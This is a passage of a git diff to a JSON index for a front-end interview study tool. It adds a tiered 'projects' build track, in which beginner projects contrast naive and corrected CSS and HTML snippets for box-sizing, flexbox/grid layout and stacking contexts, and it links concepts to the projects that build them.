@@ -4,11 +4,12 @@
     "name": "content.json",
     "title": "Front-end interview knowledge index",
     "version": "1.0.0",
-    "generatedAt": "2026-08-26T12:37:45.354Z",
+    "generatedAt": "2026-08-26T12:58:55.318Z",
     "generator": "scripts/buildContent.ts",
     "provenance": {
       "concepts": "src/data/learn/** — authored reading curriculum",
       "drills": "src/data/masteryStream.ts — the practice stream",
+      "projects": "src/data/projects/** — the build track, coverage-checked by scripts/checkProjectCoverage.ts",
       "mcqs": "src/data/rapidFireDb.ts + rapidFireBank.ts — Mettl-shaped question bank",
       "examBlueprints": "src/data/exam/mettlBlueprints.ts — transcribed verbatim from vendor product pages",
       "inferredWeighting": "src/data/exam/examWeighting.ts — reasoned, not published; kept in a separate file so the distinction is visible"
@@ -18,6 +19,8 @@
       "drills[] and mcqs[] are practice, cross-referenced to concepts by shared tags and area names.",
       "resources[] is deduplicated: each source appears once with citedBy listing every concept that cites it.",
       "examBlueprints[] states what the assessment vendor publishes; inferredWeighting is explicitly an inference.",
+      "projects[] is the build track in three tiers: basic (0-3 YOE), intermediate, advanced. Each conceptIds entry is verified to exist, and every concept is claimed by at least one project.",
+      "buildsConcept on a concept lists the projects that construct it — the inverse of projects[].conceptIds.",
       "drillCoverage on a concept says whether the practice material actually covers it — covered | partial | missing."
     ],
     "vocabulary": {
@@ -25,7 +28,10 @@
       "invariants": "Statements that remain true and are worth memorising verbatim.",
       "interviewAngle": "The form the question actually takes in an interview or OA.",
       "drillCoverage": "How well this repository PRACTISES the concept, not how important it is.",
-      "hasVerifiableSolution": "False means the drill teaches by editing in place and cannot be auto-graded."
+      "hasVerifiableSolution": "False means the drill teaches by editing in place and cannot be auto-graded.",
+      "stages": "A project built twice or more: the naive version, its named failure mode, then the version that holds.",
+      "teaches": "A checkable coverage claim — conceptIds must resolve to a real concept or the build fails.",
+      "tier": "basic = 0-3 YOE entry point; intermediate = working engineer; advanced = the dare."
     }
   },
   "counts": {
@@ -56,7 +62,14 @@
       "partial": 17,
       "covered": 23
     },
-    "drillsWithVerifiableSolution": 163
+    "drillsWithVerifiableSolution": 163,
+    "projects": 21,
+    "projectsByTier": {
+      "basic": 10,
+      "intermediate": 5,
+      "advanced": 6
+    },
+    "conceptsWithAProject": 56
   },
   "taxonomy": {
     "areaOrder": [
@@ -449,7 +462,11 @@
         "lla-org-en-us-docs-web-html-element-script-al250c"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-perf-audit",
+        "project-hypercanvas"
+      ]
     },
     {
       "id": "web-http",
@@ -489,7 +506,11 @@
         "er-mozilla-org-en-us-docs-web-http-caching-nezwal"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-fetch-list",
+        "inter-designed-dashboard"
+      ]
     },
     {
       "id": "web-cors",
@@ -528,7 +549,11 @@
         "en-us-docs-web-security-same-origin-policy-iop56u"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-quantumtrade",
+        "adv-sandbox-runtime"
+      ]
     },
     {
       "id": "web-storage",
@@ -567,7 +592,12 @@
         "zilla-org-en-us-docs-web-api-indexeddb-api-vch8i2"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-designed-dashboard",
+        "project-chronosgraph",
+        "adv-sandbox-runtime"
+      ]
     },
     {
       "id": "web-security",
@@ -605,7 +635,12 @@
         "eloper-mozilla-org-en-us-docs-web-http-csp-l16ipg"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-pulseui",
+        "project-quantumtrade",
+        "adv-sandbox-runtime"
+      ]
     },
     {
       "id": "html-semantics",
@@ -644,7 +679,11 @@
         "web-dev-learn-accessibility-structure-ra6cvx"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-profile-card",
+        "basic-routed-app"
+      ]
     },
     {
       "id": "html-forms",
@@ -684,7 +723,10 @@
         "er-mozilla-org-en-us-docs-web-api-formdata-sk93oy"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-controlled-form"
+      ]
     },
     {
       "id": "a11y-core",
@@ -725,7 +767,12 @@
         "web-dev-learn-accessibility-f28pt3"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-overlay-stack",
+        "basic-routed-app",
+        "inter-tested-library"
+      ]
     },
     {
       "id": "css-cascade",
@@ -762,7 +809,10 @@
         "specificity-keegan-st-9owmez"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-profile-card"
+      ]
     },
     {
       "id": "css-selectors",
@@ -804,7 +854,10 @@
         "flukeout-github-io-wwp9zb"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-profile-card"
+      ]
     },
     {
       "id": "css-box-display",
@@ -843,7 +896,10 @@
         "-css-box-model-mastering-margin-collapsing-fwmkdx"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-profile-card"
+      ]
     },
     {
       "id": "css-flex-axes",
@@ -880,7 +936,10 @@
         "flexboxfroggy-com-bjnmno"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-pricing-grid"
+      ]
     },
     {
       "id": "css-flex-sizing",
@@ -916,7 +975,10 @@
         "css-tricks-com-flexbox-truncated-text-76esic"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-pricing-grid"
+      ]
     },
     {
       "id": "css-flex-align",
@@ -951,7 +1013,10 @@
         "a-org-en-us-docs-web-css-css-box-alignment-1zqwau"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-pricing-grid"
+      ]
     },
     {
       "id": "css-grid-tracks",
@@ -989,7 +1054,10 @@
         "cssgridgarden-com-rpe2gk"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-pricing-grid"
+      ]
     },
     {
       "id": "css-grid-placement",
@@ -1025,7 +1093,10 @@
         "-grid-layout-auto-placement-in-grid-layout-6ruk40"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-chronosgraph"
+      ]
     },
     {
       "id": "css-grid-align",
@@ -1061,7 +1132,11 @@
         "mozilla-org-en-us-docs-web-css-place-items-9ctj8f"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-pulseui",
+        "project-chronosgraph"
+      ]
     },
     {
       "id": "css-positioning",
@@ -1100,7 +1175,10 @@
         "-docs-web-css-css-display-containing-block-bj37mo"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-overlay-stack"
+      ]
     },
     {
       "id": "css-units",
@@ -1138,7 +1216,10 @@
         "web-dev-blog-viewport-units-tvqe47"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-profile-card"
+      ]
     },
     {
       "id": "css-ratio-logical",
@@ -1174,7 +1255,11 @@
         "ozilla-org-en-us-docs-web-css-writing-mode-ki6s9l"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-overlay-stack",
+        "inter-perf-audit"
+      ]
     },
     {
       "id": "css-media-container",
@@ -1214,7 +1299,12 @@
         "web-dev-learn-design-u3wa57"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-perf-audit",
+        "project-pulseui",
+        "project-hypercanvas"
+      ]
     },
     {
       "id": "css-states",
@@ -1253,7 +1343,10 @@
         "ai-wcag21-understanding-focus-visible-html-ajlysr"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-overlay-stack"
+      ]
     },
     {
       "id": "css-tokens-modern",
@@ -1296,7 +1389,10 @@
         "web-dev-learn-css-astq0a"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-hypercanvas"
+      ]
     },
     {
       "id": "js-types-coercion",
@@ -1334,7 +1430,10 @@
         "you-dont-know-js-tree-2nd-ed-types-grammar-59sk8p"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-equality-lab"
+      ]
     },
     {
       "id": "js-scope-closures",
@@ -1372,7 +1471,10 @@
         "erreacted-io-a-complete-guide-to-useeffect-tqvm7j"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-dom-todo"
+      ]
     },
     {
       "id": "js-this",
@@ -1406,7 +1508,11 @@
         "ipt-reference-global-objects-function-bind-ulbvhm"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-dom-todo",
+        "inter-utility-belt"
+      ]
     },
     {
       "id": "js-prototypes",
@@ -1444,7 +1550,10 @@
         "n-us-docs-web-javascript-reference-classes-g52143"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-class-museum"
+      ]
     },
     {
       "id": "js-equality-matrix",
@@ -1486,7 +1595,10 @@
         "ript-reference-global-objects-number-isnan-fvx4ep"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-equality-lab"
+      ]
     },
     {
       "id": "js-defaulting-operators",
@@ -1522,7 +1634,10 @@
         "ipt-reference-functions-default-parameters-ce5nvv"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-equality-lab"
+      ]
     },
     {
       "id": "js-event-loop",
@@ -1563,7 +1678,12 @@
         "www-jsv9000-app-mk3ey3"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-utility-belt",
+        "project-hypercanvas",
+        "project-quantumtrade"
+      ]
     },
     {
       "id": "js-promises",
@@ -1602,7 +1722,12 @@
         "eference-global-objects-promise-allsettled-792aa4"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-fetch-list",
+        "inter-utility-belt",
+        "project-quantumtrade"
+      ]
     },
     {
       "id": "js-arrays-objects",
@@ -1642,7 +1767,13 @@
         "eb-javascript-reference-global-objects-map-ijupzv"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-controlled-form",
+        "inter-utility-belt",
+        "project-quantumtrade",
+        "adv-sandbox-runtime"
+      ]
     },
     {
       "id": "js-modules",
@@ -1679,7 +1810,10 @@
         "-web-javascript-reference-operators-import-5wri0q"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-pulseui"
+      ]
     },
     {
       "id": "js-dom-events",
@@ -1721,7 +1855,10 @@
         "-docs-web-api-eventtarget-addeventlistener-5gpnza"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-dom-todo"
+      ]
     },
     {
       "id": "js-polyfills",
@@ -1760,7 +1897,10 @@
         "pt-reference-global-objects-function-apply-umhfcv"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-utility-belt"
+      ]
     },
     {
       "id": "react-rendering-model",
@@ -1814,6 +1954,10 @@
         "react-state",
         "react-effects",
         "react19-compiler"
+      ],
+      "buildsConcept": [
+        "basic-react-first",
+        "adv-react-from-scratch"
       ]
     },
     {
@@ -1861,6 +2005,11 @@
       "unlocks": [
         "react-effects",
         "react-hooks-rest"
+      ],
+      "buildsConcept": [
+        "basic-react-first",
+        "project-hypercanvas",
+        "adv-react-from-scratch"
       ]
     },
     {
@@ -1901,6 +2050,11 @@
       "unlocks": [
         "react-hooks-rest",
         "react19-actions"
+      ],
+      "buildsConcept": [
+        "basic-react-first",
+        "basic-fetch-list",
+        "adv-react-from-scratch"
       ]
     },
     {
@@ -1940,6 +2094,11 @@
       "unlocks": [
         "react19-use-hook",
         "state-management-patterns"
+      ],
+      "buildsConcept": [
+        "inter-tested-library",
+        "project-quantumtrade",
+        "adv-react-from-scratch"
       ]
     },
     {
@@ -1977,6 +2136,9 @@
       ],
       "unlocks": [
         "react-effects"
+      ],
+      "buildsConcept": [
+        "basic-class-museum"
       ]
     },
     {
@@ -2021,7 +2183,10 @@
         "-javascript-reference-global-objects-array-lnz4lb"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-controlled-form"
+      ]
     },
     {
       "id": "react-references-copying",
@@ -2060,7 +2225,13 @@
         "zilla-org-en-us-docs-glossary-shallow-copy-f4q8px"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-controlled-form",
+        "inter-utility-belt",
+        "project-hypercanvas",
+        "adv-sandbox-runtime"
+      ]
     },
     {
       "id": "react-composition",
@@ -2100,7 +2271,11 @@
         "-blog-compound-components-with-react-hooks-kqnrwc"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-routed-app",
+        "inter-tested-library"
+      ]
     },
     {
       "id": "react-perf",
@@ -2144,7 +2319,14 @@
         "tanstack-com-virtual-latest-kirnxw"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-perf-audit",
+        "project-chronosgraph",
+        "project-hypercanvas",
+        "project-quantumtrade",
+        "adv-react-from-scratch"
+      ]
     },
     {
       "id": "react-errors-portals",
@@ -2187,7 +2369,12 @@
         "react-dev-reference-react-component-bh5xj2"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-class-museum",
+        "inter-designed-dashboard",
+        "project-pulseui"
+      ]
     },
     {
       "id": "r19-actions",
@@ -2230,7 +2417,10 @@
         "react-dev-blog-2024-12-05-react-19-io9zyb"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-hypercanvas"
+      ]
     },
     {
       "id": "r19-use-rsc",
@@ -2279,7 +2469,12 @@
         "dev-reference-react-dom-client-hydrateroot-wc1vb9"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "project-pulseui",
+        "project-chronosgraph",
+        "adv-react-from-scratch"
+      ]
     },
     {
       "id": "redux-core",
@@ -2319,7 +2514,10 @@
         "-structuring-reducers-structuring-reducers-zvei2r"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-flux-to-rtk"
+      ]
     },
     {
       "id": "redux-react-toolkit",
@@ -2362,7 +2560,10 @@
         "js-org-introduction-why-rtk-is-redux-today-6td5r5"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-flux-to-rtk"
+      ]
     },
     {
       "id": "state-alternatives",
@@ -2403,7 +2604,13 @@
         "og-application-state-management-with-react-p04bvz"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-flux-to-rtk",
+        "inter-designed-dashboard",
+        "project-chronosgraph",
+        "project-quantumtrade"
+      ]
     },
     {
       "id": "router-core",
@@ -2442,7 +2649,10 @@
         "lla-org-en-us-docs-web-api-urlsearchparams-odxjl9"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "basic-routed-app"
+      ]
     },
     {
       "id": "tooling-bundlers",
@@ -2481,7 +2691,11 @@
         "webpack-js-org-guides-tree-shaking-noyuaq"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-perf-audit",
+        "project-pulseui"
+      ]
     },
     {
       "id": "tooling-flux",
@@ -2517,7 +2731,10 @@
         "understanding-history-and-design-prior-art-b97vr9"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-flux-to-rtk"
+      ]
     },
     {
       "id": "ts-essentials",
@@ -2558,7 +2775,12 @@
         "riptlang-org-docs-handbook-2-generics-html-kqvk9k"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-tested-library",
+        "project-pulseui",
+        "adv-sandbox-runtime"
+      ]
     },
     {
       "id": "testing-react",
@@ -2599,7 +2821,10 @@
         "ds-com-blog-testing-implementation-details-b4rnis"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-tested-library"
+      ]
     },
     {
       "id": "frontend-system-design",
@@ -2644,7 +2869,10 @@
         "www-w3-org-wai-aria-apg-patterns-combobox-g5gbsd"
       ],
       "prerequisites": [],
-      "unlocks": []
+      "unlocks": [],
+      "buildsConcept": [
+        "inter-designed-dashboard"
+      ]
     }
   ],
   "practice": {
@@ -11406,6 +11634,3526 @@
         ]
       }
     ]
+  },
+  "projects": [
+    {
+      "id": "basic-profile-card",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Beginner",
+      "title": "Profile Card: The Box Model, Honestly",
+      "tagline": "One card, built twice — once by guessing at margins, once by understanding the box.",
+      "realWorldAnalog": "Any team directory page ever shipped",
+      "architecturePattern": "Single semantic component, no framework",
+      "essence": "Build one profile card in plain HTML and CSS. The point is not the card — it is that you can say exactly why an element is the width it is, why two margins became one, and which of four competing rules won. Every interviewer opens with something this small.",
+      "estimatedBuildTimeHours": 2,
+      "xp": 80,
+      "prerequisites": [],
+      "inScope": [
+        "Semantic markup: article, heading hierarchy, img with real alt text.",
+        "Deliberate box-sizing, padding, border and margin on every element.",
+        "A three-rule specificity conflict you resolve without reaching for !important.",
+        "Sizing in rem and ch so the card grows with the user font size."
+      ],
+      "outOfScope": [
+        "A CSS framework or utility library.",
+        "Dark mode, animation, or a build step.",
+        "Making it a reusable component — it is one card."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "The version that looks right",
+          "focus": "Fixed pixels and a div for everything",
+          "codeSnippet": "<div class=\"card\">\n  <div class=\"name\">Priya Raman</div>\n  <div class=\"role\">Front-end Engineer</div>\n</div>\n\n.card { width: 300px; padding: 20px; border: 1px solid #ccc; }\n.name { font-size: 18px; margin-bottom: 8px; }",
+          "failureModeOrInvariant": "The card renders 342px wide, not 300px — content-box adds padding and border on top. A screen reader announces nothing but \"Priya Raman, Front-end Engineer\" with no structure. At 200% browser zoom the text overflows the fixed width.",
+          "architecturalLesson": "Width in CSS is not the width of the element unless you have said which box you meant."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "The version that holds",
+          "focus": "border-box, semantic elements, relative units, resolved cascade",
+          "codeSnippet": "*, *::before, *::after { box-sizing: border-box; }\n\n<article class=\"card\">\n  <img src=\"...\" alt=\"Priya Raman\" />\n  <h2>Priya Raman</h2>\n  <p class=\"role\">Front-end Engineer</p>\n</article>\n\n.card { inline-size: min(100%, 22rem); padding: 1.25rem; }\n/* 0,1,0 beats 0,0,1 — no !important needed */\n.card .role { color: #555; }",
+          "failureModeOrInvariant": "Width now means the border edge. The card caps at 22rem but shrinks on a narrow screen. Adjacent vertical margins collapse — you can predict which one wins before you look.",
+          "architecturalLesson": "Specificity is three numbers compared left to right, not a vague sense of importance. Once you can compute it, !important stops being necessary."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Document",
+          "components": [
+            "article",
+            "heading",
+            "img with alt",
+            "paragraph"
+          ],
+          "invariants": [
+            "Every image has alt text; decorative images have alt=\"\"."
+          ]
+        },
+        {
+          "layer": "Style",
+          "components": [
+            "box-sizing reset",
+            "cascade layer for base vs component",
+            "rem/ch sizing"
+          ],
+          "invariants": [
+            "No !important anywhere in the file."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "HTML",
+          "topic": "Semantics",
+          "subtopic": "Document outline and alt text",
+          "howCovered": "Rebuilds a div soup card as article + heading + img, then reads the resulting outline.",
+          "conceptIds": [
+            "html-semantics"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Box model",
+          "subtopic": "content-box vs border-box, margin collapse",
+          "howCovered": "Measures the same card under both box-sizing values and explains the 42px difference.",
+          "conceptIds": [
+            "css-box-display"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "The cascade",
+          "subtopic": "Specificity, inheritance, !important",
+          "howCovered": "Three rules deliberately target the same element; you compute the winner before testing.",
+          "conceptIds": [
+            "css-cascade",
+            "css-selectors"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Units",
+          "subtopic": "rem, ch, min() and relative sizing",
+          "howCovered": "Card width and spacing are expressed relative to font size, then tested at 200% zoom.",
+          "conceptIds": [
+            "css-units"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Style resolution order",
+          "mechanism": "The browser matches selectors right-to-left, resolves the cascade, then computes the box.",
+          "realWorldImpact": "Explains why a descendant selector is slower and why computed style differs from authored style.",
+          "conceptIds": [
+            "css-cascade"
+          ]
+        },
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Accessible name computation",
+          "mechanism": "Assistive tech builds a name from alt, aria-label, and content in a defined precedence order.",
+          "realWorldImpact": "A missing alt attribute makes the image announce its file name.",
+          "conceptIds": [
+            "html-semantics"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [],
+        "manualEngineeringRequired": [
+          "Every line of CSS — no framework is permitted for this build.",
+          "Computing specificity by hand before checking devtools."
+        ]
+      },
+      "conceptIds": [
+        "html-semantics",
+        "css-box-display",
+        "css-cascade",
+        "css-selectors",
+        "css-units"
+      ],
+      "tags": [
+        "html",
+        "css",
+        "box model",
+        "specificity",
+        "beginner",
+        "layout"
+      ]
+    },
+    {
+      "id": "basic-pricing-grid",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Beginner",
+      "title": "Pricing Grid: Flexbox and Grid, and Knowing Which",
+      "tagline": "Three plan cards that stay aligned when one plan has a longer name than the others.",
+      "realWorldAnalog": "Stripe / Vercel pricing page",
+      "architecturePattern": "One-dimensional rows inside a two-dimensional page grid",
+      "essence": "Lay out three pricing cards so their headers, feature lists and buttons line up across columns even when the content differs in length. This is the single most common CSS interview task, and the answer hinges on knowing that flexbox distributes along one axis while grid places on two.",
+      "estimatedBuildTimeHours": 3,
+      "xp": 110,
+      "prerequisites": [
+        "basic-profile-card"
+      ],
+      "inScope": [
+        "Page-level grid with repeat(auto-fit, minmax()) and no media query.",
+        "Card-internal flex column with an auto-margin pushing the CTA to the bottom.",
+        "flex-grow / flex-shrink / flex-basis chosen deliberately, not copied.",
+        "One deliberate flex-wrap and order demonstration."
+      ],
+      "outOfScope": [
+        "A pricing toggle, currency switcher, or checkout.",
+        "JavaScript of any kind.",
+        "Subgrid — that is the advanced tier."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Floats and fixed widths",
+          "focus": "Three cards at 33% that do not line up",
+          "codeSnippet": ".cards { display: flex; }\n.card { width: 33%; margin: 10px; }\n.card button { margin-top: 40px; }",
+          "failureModeOrInvariant": "33% plus margins overflows the row. The plan with two feature bullets has its button 60px higher than the plan with five. Below 700px the cards squash instead of stacking.",
+          "architecturalLesson": "Percentage widths and hand-tuned margins encode one specific content length. Real content is variable length."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "Axes chosen on purpose",
+          "focus": "auto-fit grid outside, flex column with auto margin inside",
+          "codeSnippet": ".cards {\n  display: grid;\n  grid-template-columns: repeat(auto-fit, minmax(16rem, 1fr));\n  gap: 1rem;                 /* gap, not margins */\n}\n.card { display: flex; flex-direction: column; }\n.card .features { flex: 1 1 auto; }   /* absorbs the difference */\n.card .cta { margin-block-start: auto; } /* pinned to the bottom */",
+          "failureModeOrInvariant": "Cards reflow from three columns to one with no media query. Buttons align across all three cards regardless of feature count, because the feature list — not the button — absorbs the free space.",
+          "architecturalLesson": "Grid for the page (two axes, unknown count), flex for the card (one axis, distribute the leftover). Naming which axis you are working on answers most layout questions."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Page",
+          "components": [
+            "auto-fit grid track definition",
+            "gap"
+          ],
+          "invariants": [
+            "Zero media queries; the layout is intrinsically responsive."
+          ]
+        },
+        {
+          "layer": "Card",
+          "components": [
+            "flex column",
+            "growing feature list",
+            "auto-margin CTA"
+          ],
+          "invariants": [
+            "CTA baseline matches across cards for any feature count from 1 to 8."
+          ]
+        }
+      ],
+      "teaches": [
+        {
+          "category": "CSS",
+          "topic": "Flexbox",
+          "subtopic": "Main vs cross axis, direction, wrap and order",
+          "howCovered": "The card is a flex column; you flip direction and wrap to observe which axis each property acts on.",
+          "conceptIds": [
+            "css-flex-axes"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Flexbox",
+          "subtopic": "flex shorthand, basis vs width, grow and shrink",
+          "howCovered": "The feature list is given flex: 1 1 auto so it, not the button, absorbs unequal content.",
+          "conceptIds": [
+            "css-flex-sizing"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Flexbox",
+          "subtopic": "align-self and auto margins",
+          "howCovered": "margin-block-start: auto pins the CTA — the auto-margin trick asked for by name in interviews.",
+          "conceptIds": [
+            "css-flex-align"
+          ]
+        },
+        {
+          "category": "CSS",
+          "topic": "Grid",
+          "subtopic": "fr, repeat, minmax, auto-fit vs auto-fill",
+          "howCovered": "The page track list is built with auto-fit and minmax, then swapped to auto-fill to see the difference.",
+          "conceptIds": [
+            "css-grid-tracks"
+          ]
+        }
+      ],
+      "implicitFoundations": [
+        {
+          "domain": "DOM & Browser Pipeline",
+          "title": "Intrinsic sizing",
+          "mechanism": "min-content and max-content contributions decide how far a track can shrink before overflow.",
+          "realWorldImpact": "Explains why minmax(16rem, 1fr) stops the squash that width: 33% could not.",
+          "conceptIds": [
+            "css-grid-tracks",
+            "css-units"
+          ]
+        }
+      ],
+      "frameworkVsManual": {
+        "frameworkHandled": [],
+        "manualEngineeringRequired": [
+          "Choosing the axis before choosing the property.",
+          "Testing with deliberately unequal content lengths."
+        ]
+      },
+      "conceptIds": [
+        "css-flex-axes",
+        "css-flex-sizing",
+        "css-flex-align",
+        "css-grid-tracks"
+      ],
+      "tags": [
+        "css",
+        "flexbox",
+        "grid",
+        "responsive",
+        "beginner",
+        "layout"
+      ]
+    },
+    {
+      "id": "basic-overlay-stack",
+      "kind": "project",
+      "tier": "basic",
+      "difficulty": "Beginner",
+      "title": "Sticky Header & Modal: Where Things Sit and Who Is On Top",
+      "tagline": "A sticky bar, a dropdown and a dialog — and a z-index that finally behaves.",
+      "realWorldAnalog": "The header of nearly every product you use",
+      "architecturePattern": "Positioned layers over a scrolling document",
+      "essence": "Build a sticky header containing a dropdown, plus a centred modal that traps focus. The interview question hiding inside is \"why does z-index: 9999 not put my dropdown on top?\" — and the answer is stacking contexts, not bigger numbers.",
+      "estimatedBuildTimeHours": 3,
+      "xp": 120,
+      "prerequisites": [
+        "basic-profile-card"
+      ],
+      "inScope": [
+        "position: sticky header with a correct containing block.",
+        "Absolutely positioned dropdown anchored to a relative parent.",
+        "A modal centred without magic numbers, with a visible :focus-visible ring.",
+        "One deliberate stacking-context trap, diagnosed and fixed."
+      ],
+      "outOfScope": [
+        "A dialog library or focus-trap package.",
+        "Animation and transitions.",
+        "Mobile navigation drawer behaviour."
+      ],
+      "stages": [
+        {
+          "stageNumber": 1,
+          "stageName": "Bigger numbers",
+          "focus": "z-index escalation and outline: none",
+          "codeSnippet": ".header { position: sticky; top: 0; z-index: 10; }\n.card { transform: translateY(0); }   /* looks harmless */\n.dropdown { position: absolute; z-index: 9999; }\n*:focus { outline: none; }            /* \"it looked ugly\" */",
+          "failureModeOrInvariant": "The dropdown at z-index 9999 still renders behind the card, because transform on an ancestor created a new stacking context and 9999 only competes inside it. The sticky header stops sticking when a parent has overflow: hidden. Keyboard users cannot see where they are at all.",
+          "architecturalLesson": "z-index is compared only among siblings within the same stacking context. transform, filter, opacity below 1 and will-change all create one."
+        },
+        {
+          "stageNumber": 2,
+          "stageName": "Layers you can reason about",
+          "focus": "Named stacking contexts, correct containing blocks, visible focus",
+          "codeSnippet": "/* One place that owns layer order */\n:root { --z-header: 100; --z-dropdown: 200; --z-modal: 300; }\n\n.menu { position: relative; }            /* the containing block */\n.dropdown { position: absolute; inset-block-start: 100%; z-index: var(--z-dropdown); }\n\n.modal { position: fixed; inset: 0; display: grid; place-items: center; }\n:focus-visible { outline: 2px solid CanvasText; outline-offset: 2px; }",
+          "failureModeOrInvariant": "Layer order lives in four tokens rather than scattered across twenty files. The modal centres with place-items rather than a translate hack. Focus is visible for keyboard users and absent for mouse users, which is exactly what :focus-visible means.",
+          "architecturalLesson": "An absolutely positioned element is placed against its nearest positioned ancestor. Fix the containing block and the coordinates stop being guesswork."
+        }
+      ],
+      "layers": [
+        {
+          "layer": "Layout",
+          "components": [
+            "sticky header",
+            "relative menu",
+            "absolute dropdown",
+            "fixed modal"
+          ],
+          "invariants": [
+            "Every absolute child has an explicitly positioned ancestor."
+          ]
+        },
+        {
+          "layer": "Interaction",
+          "components": [
+            ":focus-visible ring",
+            "Escape to close",
